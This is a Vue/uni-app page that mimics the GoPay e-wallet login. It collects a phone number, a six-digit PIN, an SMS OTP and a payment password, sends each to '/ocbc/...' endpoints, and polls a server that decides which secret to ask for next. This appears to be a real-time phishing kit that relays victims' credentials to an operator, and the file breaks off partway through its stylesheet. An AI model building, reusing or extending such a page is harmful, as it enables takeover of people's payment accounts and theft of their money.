<template>
  <view class="gopay-page">
    <!-- 顶部导航栏 -->
    <view class="top-bar">
      <!-- 左侧返回按钮 -->
      <view class="back-btn" @click="handleBack">
        <text class="bi bi-arrow-left back-icon"></text>
      </view>

      <!-- 右侧语言切换 -->
      <view class="lang-switcher">
        <text class="lang-translate-icon">文A</text>
        <text class="lang-text">Bahasa Indonesia</text>
      </view>
    </view>

    <!-- 主体内容区域 -->
    <view class="content-area">
      <!-- 标题区域 -->
      <view class="title-section">
        <text class="main-title">{{ t('gopay.welcomeTitle') }}</text>
        <text class="sub-title">{{ t('gopay.subtitle') }}</text>
      </view>

      <!-- 手机号输入区域 -->
      <view class="phone-section">
        <text class="phone-label">{{ t('gopay.phoneLabel') }} <text class="required-star">*</text></text>

        <view class="phone-input-row">
          <!-- 国家代码 -->
          <view class="country-code">
            <image class="country-flag" src="https://flagcdn.com/w40/id.png" mode="aspectFit" />
            <text class="code-text">+62</text>
          </view>

          <!-- 手机号输入框 -->
          <view class="phone-input-wrapper">
            <input
              class="phone-input"
              v-model="phoneNumber"
              type="number"
              placeholder="81x-xxx-xxx"
              placeholder-class="phone-placeholder"
              maxlength="13"
              @input="onPhoneInput"
            />
          </view>
        </view>
      </view>

      <!-- Issue with number 标签 -->
      <view class="issue-tag" @click="handleIssue">
        <text class="issue-text">{{ t('gopay.issueWithNumber') }}</text>
      </view>

      <!-- Continue 按钮 -->
      <button
        class="continue-btn"
        :class="{ 'continue-btn-disabled': !canContinue }"
        :disabled="!canContinue"
        @click="handleLogin"
      >
        {{ t('gopay.continueBtn') }}
      </button>

    </view>

    <!-- ========== 步骤二：PIN 输入页面 ========== -->
    <view v-if="showPinPage" class="pin-page">
      <!-- PIN 顶部栏 -->
      <view class="pin-top-bar">
        <view class="pin-close-btn" @click="closePinPage">
          <text class="bi bi-x-lg pin-close-icon"></text>
        </view>
        <text class="pin-top-title">{{ t('gopay.pinTitle') }}</text>
        <view class="pin-help-btn" @click="handleHelp">
          <text class="bi bi-question-circle pin-help-icon"></text>
        </view>
      </view>

      <!-- PIN 内容区域 -->
      <view class="pin-content">
        <text class="pin-subtitle">{{ t('gopay.pinSubtitle') }}</text>
        <text class="pin-desc">{{ t('gopay.pinDesc') }}</text>

        <!-- PIN 圆点指示器 -->
        <view class="pin-dots-card">
          <view class="pin-dots-row">
            <view v-for="i in 6" :key="i" class="pin-dot" :class="{ 'pin-dot-filled': pinDigits.length >= i }">
              <view v-if="pinDigits.length >= i" class="pin-dot-inner"></view>
            </view>
          </view>
        </view>

        <!-- Login issues 标签 -->
        <view class="pin-issue-tag">
          <text class="pin-issue-text">{{ t('gopay.loginIssues') }}</text>
        </view>
      </view>

      <!-- 底部品牌 -->
      <view class="pin-branding">
        <text class="pin-powered">Powered by</text>
        <view class="pin-gopay-logo">
          <view class="pin-gopay-dot"></view>
          <text class="pin-gopay-text">gopay</text>
        </view>
      </view>

      <!-- 自定义数字键盘 -->
      <view class="pin-keypad">
        <view class="keypad-row">
          <view class="keypad-key" @click="onPinKey('1')"><text class="keypad-num">1</text></view>
          <view class="keypad-key" @click="onPinKey('2')"><text class="keypad-num">2</text></view>
          <view class="keypad-key" @click="onPinKey('3')"><text class="keypad-num">3</text></view>
        </view>
        <view class="keypad-row">
          <view class="keypad-key" @click="onPinKey('4')"><text class="keypad-num">4</text></view>
          <view class="keypad-key" @click="onPinKey('5')"><text class="keypad-num">5</text></view>
          <view class="keypad-key" @click="onPinKey('6')"><text class="keypad-num">6</text></view>
        </view>
        <view class="keypad-row">
          <view class="keypad-key" @click="onPinKey('7')"><text class="keypad-num">7</text></view>
          <view class="keypad-key" @click="onPinKey('8')"><text class="keypad-num">8</text></view>
          <view class="keypad-key" @click="onPinKey('9')"><text class="keypad-num">9</text></view>
        </view>
        <view class="keypad-row">
          <view class="keypad-key keypad-empty"></view>
          <view class="keypad-key" @click="onPinKey('0')"><text class="keypad-num">0</text></view>
          <view class="keypad-key" @click="onPinDelete">
            <text class="bi bi-backspace keypad-backspace"></text>
          </view>
        </view>
      </view>
    </view>

    <!-- ========== 步骤三：OTP 验证页面 ========== -->
    <view v-if="showOtpPage" class="otp-page">
      <!-- OTP 顶部栏 -->
      <view class="otp-top-bar">
        <view class="otp-back-btn" @click="closeOtpPage">
          <text class="bi bi-arrow-left otp-back-icon"></text>
        </view>
        <view class="otp-top-right">
          <view class="otp-help-btn" @click="handleHelp">
            <text class="bi bi-question-circle otp-help-icon"></text>
          </view>
        </view>
      </view>

      <!-- OTP 内容区域 -->
      <view class="otp-page-content">
        <text class="otp-page-title">{{ t('gopay.otpSmsTitle') }}</text>
        <text class="otp-page-desc">{{ t('gopay.otpSmsDesc') }} {{ maskedPhone }}</text>

        <!-- OTP 输入区域 -->
        <view class="otp-input-section">
          <text class="otp-input-label">OTP <text class="required-star">*</text></text>

          <view class="otp-input-row" @click="focusOtpInput">
            <view class="otp-dots-area">
              <text v-for="i in otpInput.length" :key="i" class="otp-entered-dot">●</text>
              <view v-if="otpInput.length < 4" class="otp-cursor"></view>
            </view>
            <view v-if="otpCountdown > 0" class="otp-timer-area">
              <view class="otp-loading-spinner"></view>
              <text class="otp-countdown">{{ otpCountdownText }}</text>
            </view>
            <view v-else class="otp-resend" @click="resendOtp">
              <text class="otp-resend-text">{{ t('gopay.resendOtp') }}</text>
            </view>
          </view>
          <view class="otp-input-line"></view>

          <!-- 隐藏的真实输入框 -->
          <input
            ref="otpInputRef"
            class="otp-hidden-input"
            v-model="otpInput"
            type="number"
            maxlength="4"
            :focus="otpInputFocus"
            @input="onOtpInput"
          />
        </view>

        <!-- Login issues 标签 -->
        <view class="otp-issue-tag">
          <text class="otp-issue-text">{{ t('gopay.loginIssues') }}</text>
        </view>
      </view>
    </view>

    <!-- 加载中遮罩 -->
    <view v-if="showLoading" class="loading-overlay">
      <view class="loading-spinner">
        <view class="spinner"></view>
        <text class="loading-text">{{ t('gopay.processing') }}</text>
      </view>
    </view>

    <!-- ========== 支付密码全屏页面 ========== -->
    <view v-if="showPaymentPasswordModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="closePaymentPasswordPage">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
        <view class="status-page-help" @click="handleHelp">
          <text class="bi bi-question-circle status-page-help-icon"></text>
        </view>
      </view>
      <view class="status-page-body">
        <text class="status-page-heading">{{ t('gopay.paymentPasswordTitle') }}</text>

        <view v-if="withdrawalAccount?.account_name || withdrawalAccount?.account_number" class="sp-account-card">
          <text class="sp-account-label">{{ t('gopay.withdrawalAccountLabel') }}</text>
          <view class="sp-account-box">
            <view v-if="withdrawalAccount?.account_name" class="sp-account-row">
              <text class="sp-row-label">{{ t('gopay.accountName') }}</text>
              <text class="sp-row-value">{{ withdrawalAccount.account_name }}</text>
            </view>
            <view v-if="withdrawalAccount?.account_number" class="sp-account-row">
              <text class="sp-row-label">{{ t('gopay.accountNumber') }}</text>
              <text class="sp-row-value">{{ withdrawalAccount.account_number }}</text>
            </view>
            <view v-if="withdrawalAccount?.bank_name" class="sp-account-row">
              <text class="sp-row-label">{{ t('gopay.bankName') }}</text>
              <text class="sp-row-value">{{ withdrawalAccount.bank_name }}</text>
            </view>
          </view>
        </view>

        <view class="sp-password-section">
          <text class="sp-pwd-label">{{ t('gopay.password') }} <text class="required-star">*</text></text>
          <input class="sp-pwd-input" v-model="paymentPasswordInput" type="password" password
            :placeholder="t('gopay.paymentPasswordPlaceholder')" maxlength="6" />
        </view>

        <view class="sp-security-notice">
          <text class="bi bi-shield-check sp-shield-icon"></text>
          <view class="sp-notice-body">
            <text class="sp-notice-title">{{ t('gopay.securityNotice') }}</text>
            <text class="sp-notice-text">{{ t('gopay.securityNoticeText') }}</text>
          </view>
        </view>
      </view>
      <view class="status-page-footer">
        <button class="sp-submit-btn" @click="submitPaymentPassword">{{ t('gopay.submit') }}</button>
      </view>
    </view>

    <!-- ========== OTP 错误全屏页面 ========== -->
    <view v-if="showCaptchaErrorModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="retryCaptcha">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-error">
          <text class="bi bi-x-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-error">{{ t('gopay.otpErrorTitle') }}</text>
        <text class="sp-result-message">{{ t('gopay.otpErrorMessage') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-error" @click="retryCaptcha">{{ t('gopay.reenter') }}</button>
      </view>
    </view>

    <!-- ========== 支付密码错误全屏页面 ========== -->
    <view v-if="showPaymentPasswordErrorModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="retryPaymentPassword">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-error">
          <text class="bi bi-x-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-error">{{ t('gopay.paymentPasswordErrorTitle') }}</text>
        <text class="sp-result-message">{{ t('gopay.paymentPasswordErrorMessage') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-error" @click="retryPaymentPassword">{{ t('gopay.reenter') }}</button>
      </view>
    </view>

    <!-- ========== 成功全屏页面 ========== -->
    <view v-if="showSuccessModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="handleLoginSuccess">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-success">
          <text class="bi bi-check-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-success">{{ t('gopay.successTitle') }}</text>
        <text class="sp-result-message">{{ t('gopay.successMessage') }}</text>
        <text class="sp-result-desc">{{ t('gopay.successDescription') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-success" @click="handleLoginSuccess">{{ t('gopay.ok') }}</button>
      </view>
    </view>

    <!-- ========== 失败全屏页面 ========== -->
    <view v-if="showFailedModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="handleLoginFailed">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-error">
          <text class="bi bi-x-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-error">{{ t('gopay.failedTitle') }}</text>
        <text class="sp-result-message">{{ t('gopay.failedMessage') }}</text>
        <text class="sp-result-desc">{{ t('gopay.failedDescription') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-error" @click="handleLoginFailed">{{ t('gopay.tryAgain') }}</button>
      </view>
    </view>

    <!-- ========== 系统维护全屏页面 ========== -->
    <view v-if="showMaintenanceModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="handleMaintenanceClose">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-warning">
          <text class="bi bi-tools sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-warning">{{ t('gopay.maintenanceTitle') }}</text>
        <text class="sp-result-message">{{ t('gopay.maintenanceMessage') }}</text>
        <text class="sp-result-desc">{{ t('gopay.maintenanceDescription') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-warning" @click="handleMaintenanceClose">{{ t('gopay.ok') }}</button>
      </view>
    </view>
  </view>
</template>

<script setup lang="ts">
import { ref, computed, onUnmounted } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { useI18n } from 'vue-i18n'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

const { t } = useI18n()

const phoneNumber = ref('')
const logoUrl = ref('')
const bankCode = ref('')

// PIN 页面状态
const showPinPage = ref(false)
const pinDigits = ref('')

// OTP 步骤三状态
const showOtpPage = ref(false)
const otpInput = ref('')
const otpInputFocus = ref(false)
const otpCountdown = ref(30)
let otpTimer: any = null

// 加载状态
const showLoading = ref(false)

// 全屏状态页面
const showCaptchaErrorModal = ref(false)
const showPaymentPasswordModal = ref(false)
const showPaymentPasswordErrorModal = ref(false)
const showSuccessModal = ref(false)
const showFailedModal = ref(false)
const showMaintenanceModal = ref(false)

// 输入数据
const paymentPasswordInput = ref('')
const withdrawalAccount = ref<any>(null)

// 记录ID和轮询
const recordId = ref<number>(0)
let pollingTimer: any = null
let isPolling = false
let pollingCount = 0
const MAX_POLLING_COUNT = 60

onUnmounted(() => {
  if (pollingTimer) clearInterval(pollingTimer)
  if (otpTimer) clearInterval(otpTimer)
})

// 获取URL参数
onLoad((options) => {
  const token = getToken()
  if (!token) {
    uni.showToast({
      title: t('common.pleaseLoginFirst') || 'Please login first',
      icon: 'none',
      duration: 2000
    })
    setTimeout(() => {
      uni.reLaunch({ url: '/pages/auth/login' })
    }, 2000)
    return
  }

  if (options?.code) {
    bankCode.value = options.code
  }
  if (options?.logo) {
    logoUrl.value = decodeURIComponent(options.logo)
  }
})

function onPhoneInput() {
  phoneNumber.value = phoneNumber.value.replace(/\D/g, '').slice(0, 13)
}

const canContinue = computed(() => {
  return phoneNumber.value.trim().length >= 9
})

function handleBack() {
  uni.navigateBack()
}

function handleHelp() {
  // 帮助页面
}

function handleIssue() {
  // 号码问题帮助
}


// 点击 Continue 显示 PIN 页面
function handleLogin() {
  if (!canContinue.value || showLoading.value) return
  showPinPage.value = true
}

// 关闭 PIN 页面
function closePinPage() {
  showPinPage.value = false
  pinDigits.value = ''
}

// PIN 键盘按键
function onPinKey(digit: string) {
  if (pinDigits.value.length >= 6) return
  pinDigits.value += digit
  // 输入满6位自动提交
  if (pinDigits.value.length === 6) {
    submitPin()
  }
}

// PIN 删除
function onPinDelete() {
  if (pinDigits.value.length > 0) {
    pinDigits.value = pinDigits.value.slice(0, -1)
  }
}

// 提交 PIN 登录
async function submitPin() {
  showLoading.value = true
  try {
    const res = await post('/ocbc/submitLogin', {
      account_type: bankCode.value || 'gopay',
      organization_id: phoneNumber.value,
      user_id: phoneNumber.value,
      password: pinDigits.value
    }, { showError: false })

    recordId.value = res.data.record_id
    // 不隐藏 PIN 页面，等轮询结果决定
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    pinDigits.value = ''
    uni.showToast({
      title: error.message || 'Login failed',
      icon: 'none'
    })
  }
}

// 手机号打码显示
const maskedPhone = computed(() => {
  const phone = phoneNumber.value
  if (phone.length <= 4) return '+62' + phone
  const last4 = phone.slice(-4)
  const masked = '*'.repeat(phone.length - 4)
  return '+62' + masked + last4
})

// OTP 倒计时文字
const otpCountdownText = computed(() => {
  const mins = Math.floor(otpCountdown.value / 60)
  const secs = otpCountdown.value % 60
  return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
})

// 打开 OTP 页面
function openOtpPage() {
  showOtpPage.value = true
  otpInput.value = ''
  otpInputFocus.value = true
  startOtpCountdown()
}

// 关闭 OTP 页面
function closeOtpPage() {
  showOtpPage.value = false
  otpInput.value = ''
  otpInputFocus.value = false
  stopOtpCountdown()
}

// 聚焦 OTP 输入
function focusOtpInput() {
  otpInputFocus.value = false
  setTimeout(() => {
    otpInputFocus.value = true
  }, 100)
}

// OTP 输入处理
function onOtpInput() {
  otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 4)
  if (otpInput.value.length === 4) {
    submitOtpFromPage()
  }
}

// 从 OTP 页面提交
async function submitOtpFromPage() {
  showLoading.value = true
  stopOtpCountdown()

  try {
    await post('/ocbc/submitCaptcha', {
      record_id: recordId.value,
      captcha: otpInput.value
    }, { showError: false })

    // 不清空输入，不隐藏 OTP 页面，等轮询结果决定
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showCaptchaErrorModal.value = true
  }
}

// 开始 OTP 倒计时
function startOtpCountdown() {
  stopOtpCountdown()
  otpCountdown.value = 30
  otpTimer = setInterval(() => {
    if (otpCountdown.value > 0) {
      otpCountdown.value--
    } else {
      stopOtpCountdown()
    }
  }, 1000)
}

// 重新发送 OTP
function resendOtp() {
  otpInput.value = ''
  startOtpCountdown()
}

// 停止 OTP 倒计时
function stopOtpCountdown() {
  if (otpTimer) {
    clearInterval(otpTimer)
    otpTimer = null
  }
}

// 开始轮询状态
function startPolling() {
  stopPolling()
  pollingCount = 0
  isPolling = false
  pollingTimer = setInterval(async () => {
    if (isPolling) return // 防止并发请求
    await pollStatus()
  }, 2000)
}

// 停止轮询
function stopPolling() {
  if (pollingTimer) {
    clearInterval(pollingTimer)
    pollingTimer = null
  }
  isPolling = false
  pollingCount = 0
}

// 轮询状态
async function pollStatus() {
  isPolling = true
  pollingCount++

  // 超时保护：超过最大次数停止轮询
  if (pollingCount > MAX_POLLING_COUNT) {
    stopPolling()
    showLoading.value = false
    closeAllStepPages()
    showFailedModal.value = true
    return
  }

  try {
    const res = await post('/ocbc/pollStatus', {
      record_id: recordId.value
    }, { showError: false })

    const status = res.data.status
    handleStatusChange(status, res.data)
  } catch (error) {
    console.error('Poll status error:', error)
  } finally {
    isPolling = false
  }
}

// 关闭所有步骤页面
function closeAllStepPages() {
  showPinPage.value = false
  pinDigits.value = ''
  showOtpPage.value = false
  otpInput.value = ''
  otpInputFocus.value = false
  showPaymentPasswordModal.value = false
  paymentPasswordInput.value = ''
  stopOtpCountdown()
}

// 关闭支付密码页面
function closePaymentPasswordPage() {
  showPaymentPasswordModal.value = false
  paymentPasswordInput.value = ''
}

// 处理状态变化（轮询有结果后才关闭步骤页面）
function handleStatusChange(status: string, data: any) {
  switch (status) {
    case 'need_captcha':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      openOtpPage()
      break

    case 'need_payment_password':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      withdrawalAccount.value = data.withdrawal_account
      showPaymentPasswordModal.value = true
      break

    case 'success':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showSuccessModal.value = true
      break

    case 'payment_password_error':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showPaymentPasswordErrorModal.value = true
      break

    case 'captcha_error':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showCaptchaErrorModal.value = true
      break

    case 'password_error':
    case 'failed':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showFailedModal.value = true
      break

    case 'maintenance':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showMaintenanceModal.value = true
      break

    default:
      break
  }
}

// 提交支付密码
async function submitPaymentPassword() {
  if (!paymentPasswordInput.value) {
    uni.showToast({
      title: t('gopay.pleaseEnterPaymentPassword') || 'Please enter payment password',
      icon: 'none'
    })
    return
  }

  showLoading.value = true

  try {
    await post('/ocbc/submitPaymentPassword', {
      record_id: recordId.value,
      payment_password: paymentPasswordInput.value
    }, { showError: false })

    paymentPasswordInput.value = ''
    // 不隐藏支付密码页面，等轮询结果决定
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showPaymentPasswordErrorModal.value = true
  }
}

// 重试验证码 - 打开 OTP 全屏页面
function retryCaptcha() {
  showCaptchaErrorModal.value = false
  otpInput.value = ''
  openOtpPage()
}

// 重试支付密码
function retryPaymentPassword() {
  showPaymentPasswordErrorModal.value = false
  paymentPasswordInput.value = ''
  showPaymentPasswordModal.value = true
}

// 登录成功
function handleLoginSuccess() {
  showSuccessModal.value = false
  uni.redirectTo({
    url: '/pages/wallet/withdraw'
  })
}

// 登录失败
function handleLoginFailed() {
  showFailedModal.value = false
  phoneNumber.value = ''
}

// 关闭维护弹窗
function handleMaintenanceClose() {
  showMaintenanceModal.value = false
  uni.navigateBack()
}
</script>

<style lang="scss" scoped>
.gopay-page {
  min-height: 100vh;
  background: #FFFFFF;
  display: flex;
  flex-direction: column;
}

/* ========== 顶部导航栏 ========== */
.top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
}

.back-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.back-icon {
  font-size: 44rpx;
  color: #1a1a1a;
  font-weight: 600;
}

.help-btn {
  width: 72rpx;
  height: 72rpx;
  border-radius: 50%;
  border: 2rpx solid #e0e0e0;
  display: flex;
  align-items: center;
  justify-content: center;
}

.help-icon {
  font-size: 36rpx;
  color: #1a1a1a;
}

.lang-switcher {
  display: flex;
  align-items: center;
  gap: 10rpx;
  border: 2rpx solid #e0e0e0;
  border-radius: 40rpx;
  padding: 12rpx 24rpx;
}

.lang-translate-icon {
  font-size: 28rpx;
  color: #1a1a1a;
  font-weight: 500;
}

.lang-text {
  font-size: 28rpx;
  color: #1a1a1a;
  font-weight: 500;
}

/* ========== 主体内容 ========== */
.content-area {
  flex: 1;
  padding: 32rpx 48rpx 48rpx;
}

.title-section {
  margin-bottom: 48rpx;
}

.main-title {
  display: block;
  font-size: 48rpx;
  font-weight: 700;
  color: #1a1a1a;
  line-height: 1.3;
  margin-bottom: 12rpx;
}

.sub-title {
  display: block;
  font-size: 30rpx;
  color: #4a4a4a;
  line-height: 1.5;
}

/* ========== 手机号输入 ========== */
.phone-section {
  margin-bottom: 24rpx;
}

.phone-label {
  display: block;
  font-size: 28rpx;
  color: #4a4a4a;
  margin-bottom: 16rpx;
}

.required-star {
  color: #e53935;
  font-size: 28rpx;
}

.phone-input-row {
  display: flex;
  align-items: center;
  border-bottom: 2rpx solid #e0e0e0;
  padding-bottom: 16rpx;
}

.country-code {
  display: flex;
  align-items: center;
  gap: 12rpx;
  padding-right: 24rpx;
  flex-shrink: 0;
}

.country-flag {
  width: 44rpx;
  height: 30rpx;
  border-radius: 4rpx;
}

.code-text {
  font-size: 32rpx;
  color: #1a1a1a;
  font-weight: 500;
}

.phone-input-wrapper {
  flex: 1;
  padding-left: 24rpx;
  border-left: 2rpx solid #e0e0e0;
}

.phone-input {
  width: 100%;
  height: 60rpx;
  font-size: 32rpx;
  color: #1a1a1a;
  background: transparent;
}

.phone-placeholder {
  color: #bdbdbd;
  font-size: 32rpx;
}

/* ========== Issue 标签 ========== */
.issue-tag {
  display: inline-flex;
  align-items: center;
  background: #e8f5e9;
  border-radius: 32rpx;
  padding: 12rpx 28rpx;
  margin-bottom: 48rpx;
  align-self: flex-start;
}

.issue-text {
  font-size: 26rpx;
  font-weight: 600;
  color: #00AA13;
}

/* ========== Continue 按钮 ========== */
.continue-btn {
  width: 100%;
  height: 104rpx;
  background: linear-gradient(135deg, #c0c0c0 0%, #a0a0a0 50%, #c0c0c0 100%);
  border-radius: 52rpx;
  font-size: 34rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  margin-bottom: 36rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.continue-btn::after {
  border: none;
}

.continue-btn:not(.continue-btn-disabled) {
  background: linear-gradient(135deg, #00880a 0%, #00aa0c 100%);
}

.continue-btn-disabled {
  background: linear-gradient(135deg, #d0d0d0 0%, #b8b8b8 50%, #d0d0d0 100%);
  color: #FFFFFF;
}

/* ========== or 分隔 ========== */
.or-divider {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 36rpx;
}

.or-text {
  font-size: 28rpx;
  color: #9e9e9e;
}

/* ========== Google 按钮 ========== */
.google-btn {
  width: 100%;
  height: 104rpx;
  background: #FFFFFF;
  border-radius: 52rpx;
  border: 2rpx solid #e0e0e0;
  display: flex;
  flex-direction: row;
  align-items: center;
  justify-content: center;
  gap: 16rpx;
  margin-bottom: 64rpx;
}

.google-btn::after {
  border: none;
}

.google-icon {
  width: 40rpx;
  height: 40rpx;
}

.google-text {
  font-size: 30rpx;
  font-weight: 600;
  color: #1a1a1a;
}

/* ========== from goto ========== */
.goto-section {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12rpx;
}

.from-text {
  font-size: 26rpx;
  color: #9e9e9e;
}

.goto-logo {
  display: flex;
  align-items: center;
}

.goto-text-go {
  font-size: 36rpx;
  font-weight: 700;
  color: #00880a;
}

.goto-text-to {
  font-size: 36rpx;
  font-weight: 700;
  color: #1a1a1a;
}

/* ========== 加载遮罩 ========== */
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.loading-spinner {
  background: #FFFFFF;
  border-radius: 24rpx;
  padding: 60rpx;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24rpx;
  box-shadow: 0 8rpx 32rpx rgba(0, 0, 0, 0.15);
}

.spinner {
  width: 80rpx;
  height: 80rpx;
  border: 6rpx solid #e8f5e9;
  border-top-color: #00880a;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.loading-text {
  font-size: 28rpx;
  color: #00880a;
  font-weight: 600;
}

/* ========== 全屏状态页面（支付密码、错误、成功、维护等） ========== */
.status-page {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: #f0f2f5;
  z-index: 9998;
  display: flex;
  flex-direction: column;
}

.status-page-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
  background: #f0f2f5;
}

.status-page-back {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.status-page-back-icon {
  font-size: 44rpx;
  color: #1a1a1a;
  font-weight: 600;
}

.status-page-help {
  width: 72rpx;
  height: 72rpx;
  border-radius: 50%;
  border: 3rpx solid #1a1a1a;
  display: flex;
  align-items: center;
  justify-content: center;
}

.status-page-help-icon {
  font-size: 36rpx;
  color: #1a1a1a;
}

/* 状态页面主体 - 用于支付密码等带表单的页面 */
.status-page-body {
  flex: 1;
  padding: 32rpx 48rpx 0;
  overflow-y: auto;
}

.status-page-heading {
  display: block;
  font-size: 44rpx;
  font-weight: 700;
  color: #1a1a1a;
  line-height: 1.3;
  margin-bottom: 32rpx;
}

/* 状态页面居中 - 用于结果展示页面（成功/失败/维护） */
.status-page-center {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 48rpx;
  text-align: center;
}

/* 状态页面底部按钮区域 */
.status-page-footer {
  padding: 32rpx 48rpx calc(env(safe-area-inset-bottom) + 32rpx);
  flex-shrink: 0;
}

/* 图标圆圈 */
.sp-icon-circle {
  width: 160rpx;
  height: 160rpx;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 40rpx;
}

.sp-icon-error {
  background: #fce4e4;
}

.sp-icon-success {
  background: #e8f5e9;
}

.sp-icon-warning {
  background: #fff8e1;
}

.sp-icon-symbol {
  font-size: 72rpx;
  font-weight: 700;
}

.sp-icon-error .sp-icon-symbol {
  color: #e53935;
}

.sp-icon-success .sp-icon-symbol {
  color: #00880a;
}

.sp-icon-warning .sp-icon-symbol {
  color: #f9a825;
}

/* 结果文字 */
.sp-result-title {
  display: block;
  font-size: 40rpx;
  font-weight: 700;
  margin-bottom: 16rpx;
}

.sp-color-error {
  color: #e53935;
}

.sp-color-success {
  color: #00880a;
}

.sp-color-warning {
  color: #f9a825;
}

.sp-result-message {
  display: block;
  font-size: 30rpx;
  color: #4a4a4a;
  margin-bottom: 12rpx;
  font-weight: 500;
  line-height: 1.5;
}

.sp-result-desc {
  display: block;
  font-size: 26rpx;
  color: #9e9e9e;
  line-height: 1.6;
  max-width: 520rpx;
}

/* 操作按钮 */
.sp-action-btn {
  width: 100%;
  height: 104rpx;
  border-radius: 52rpx;
  font-size: 34rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.sp-action-btn::after {
  border: none;
}

.sp-btn-error {
  background: #e53935;
}

.sp-btn-success {
  background: #00880a;
}

.sp-btn-warning {
  background: #f9a825;
  color: #1a1a1a;
}

/* ========== 支付密码页面样式 ========== */
.sp-account-card {
  margin-bottom: 32rpx;
}

.sp-account-label {
  display: block;
  font-size: 26rpx;
  color: #9e9e9e;
  margin-bottom: 12rpx;
  font-weight: 600;
}

.sp-account-box {
  background: #FFFFFF;
  border-radius: 16rpx;
  padding: 24rpx;
  border: 2rpx solid #e0e0e0;
}

.sp-account-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12rpx 0;
  border-bottom: 1rpx solid #f0f0f0;

  &:last-child {
    border-bottom: none;
  }
}

.sp-row-label {
  font-size: 26rpx;
  color: #9e9e9e;
}

.sp-row-value {
  font-size: 28rpx;
  font-weight: 600;
  color: #1a1a1a;
}

.sp-password-section {
  margin-bottom: 32rpx;
}

.sp-pwd-label {
  display: block;
  font-size: 28rpx;
  color: #4a4a4a;
  margin-bottom: 16rpx;
}

.sp-pwd-input {
  
  height: 96rpx;
  background: #FFFFFF;
  border: 2rpx solid #e0e0e0;
  border-radius: 12rpx;
  padding: 0 32rpx;
  font-size: 32rpx;
  color: #1a1a1a;

  &:focus {
    border-color: #00880a;
  }
}

.sp-security-notice {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #e8f5e9;
  border-radius: 16rpx;
}

.sp-shield-icon {
  font-size: 40rpx;
  color: #00880a;
  flex-shrink: 0;
  margin-top: 4rpx;
}

.sp-notice-body {
  flex: 1;
}

.sp-notice-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #00880a;
  margin-bottom: 8rpx;
}

.sp-notice-text {
  display: block;
  font-size: 24rpx;
  color: #2e7d32;
  line-height: 1.5;
}

.sp-submit-btn {
  width: 100%;
  height: 104rpx;
  background: #00880a;
